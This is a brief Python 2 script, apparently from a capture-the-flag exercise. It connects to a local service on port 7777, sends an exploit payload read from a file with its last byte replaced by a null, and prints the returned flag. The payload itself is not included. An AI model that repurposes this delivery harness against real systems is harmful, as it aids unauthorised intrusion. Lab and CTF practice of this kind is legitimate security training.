# Echo client program
import socket
import sys
import time

HOST = 'localhost' 
PORT = 7777
print ""

print "\033[33m>>>> Connecting to %s port %d\033[0m"%(HOST, PORT)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

print "\033[33m>>>> Connection established\033[0m"

f = open(sys.argv[1],'rb')
exploit = f.read()
exploit = exploit[:-1]+'\x00'
print "\033[33m>>>> Exploit Loaded (%d bytes)\033[0m"%len(exploit)

#time.sleep(10)
s.sendall(exploit)
print "\033[33m>>>> Exploit Sent\033[0m"

print s.recv(1024).strip()

print s.recv(1024).strip()

print "\033[33m>>>> Shutting down transmission channel\033[0m"
s.shutdown(socket.SHUT_WR)
print "\033[33m>>>> Waiting for the FLAG\033[0m"

while True:
    time.sleep(1)
    d = s.recv(1024)
    if not d:
        break
    print d.strip()

